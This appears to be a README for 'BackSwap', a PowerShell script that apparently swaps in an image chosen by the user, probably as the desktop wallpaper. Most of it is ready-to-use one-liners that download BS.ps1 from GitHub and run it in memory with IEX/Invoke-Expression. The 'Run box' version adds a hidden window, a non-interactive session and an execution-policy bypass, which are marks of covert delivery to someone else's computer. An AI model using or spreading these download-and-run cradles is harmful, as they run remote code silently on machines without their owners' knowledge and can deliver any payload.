BackSwap

How to add ur own image

Go to BS.ps1 and change the "UR OWN IMAGE URL"

![image](https://github.com/VBV11/BackSwap/assets/104235290/ed41590e-4542-44e4-a2b9-cb9e2bd77571)




One line command in powershell

(Change the URL to ur own URL of the code) powershell -command IEX(IWR URL)

EXAMPLE

powershell -command IEX(IWR https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1)

Run box command

(Change the URL to ur own URL of the code) powershell -w h -NoP -NonI -Exec Bypass $pl = iwr URL?dl=1; invoke-expression $pl

EXAMPLE

powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/VBV11/BackSwap/main/BS.ps1?dl=1; invoke-expression $pl



